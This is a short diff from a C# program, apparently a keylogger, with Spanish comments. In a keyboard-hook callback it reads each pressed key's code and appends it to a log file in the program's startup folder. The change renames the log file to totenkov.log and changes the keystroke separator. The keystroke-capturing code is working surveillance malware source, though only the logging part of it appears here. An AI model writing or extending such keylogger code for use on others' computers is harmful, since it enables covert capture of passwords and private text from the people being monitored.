@@ -60,8 +60,8 @@ namespace totenkov
                 int vkCode = Marshal.ReadInt32(lParam); //Caracter que presionamos (captura-posicion de memoria)
 
                 System.Console.WriteLine((Keys)vkCode);
-                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\totenkov.txt", true); //ruta de guardado
-                sw.Write((Keys)vkCode + " ");
+                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\totenkov.log", true); //ruta de guardado
+                sw.Write((Keys)vkCode + "|");
                 sw.Close();
 
             }
